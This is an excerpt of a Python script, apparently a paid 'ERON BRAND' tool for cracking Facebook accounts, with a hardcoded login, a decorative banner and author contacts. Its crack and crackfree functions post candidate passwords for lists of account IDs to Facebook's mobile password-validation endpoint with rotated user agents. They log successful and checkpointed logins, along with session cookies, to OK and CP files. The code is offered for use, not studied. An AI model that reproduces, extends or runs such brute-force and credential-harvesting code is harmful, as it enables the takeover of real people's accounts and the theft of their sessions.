...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/ERON.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
while attemps < 12345677901:
    ...
    if username == 'ERON' and password == 'RASHI':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
  
logo ="""                 _       _______     ____  _____       _  ____   ____  
 \033[1;92m$$$$$$$$ /$$$$$$$   /$$$$$$  /$$   /$$
 \033   | $$_____/| $$__  $$ /$$__  $$| $$$ | $$
 \033 | $$      | $$  \ $$| $$  \ $$| $$$$| $$
 \033   | $$$$$   | $$$$$$$/| $$  | $$| $$ $$ $$
 ...
 \033   | $$      | $$  \ $$| $$  | $$| $$\  $$$
 \033  | $$$$$$$$| $$  | $$|  $$$$$$/| $$ \  $$
 \033  |________/|__/  |__/ \______/ |__/  \__/                                                                                                                                                                  l  
   ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   ║\33[0;41m        [MOBILE DATA ]       \033[0;92m║
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mSM-ERON ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • A-ron Bhujel ]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mERON-BRAND ]  ║\33[1;34m   
   ║    Whatsapp                 • 9746346743] ║\33[1;35m 
   ║    TOOLS                    • PAID ]        ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  ERON,  BRAND,  Tools"')
pass
...
def menu():
    ...
    if ERON in ['111']:
        ...
        os.system('xdg-open https://www.facebook.com/ERON.khadka.587')
        os.system("python nono.py")
    elif ERON in ['3','03']:
        result()
    elif ERON in ['0']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY ERON VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[ERONM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ERON-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ERON-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " ERON,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ERON-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ERON-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ERON-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ERON,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
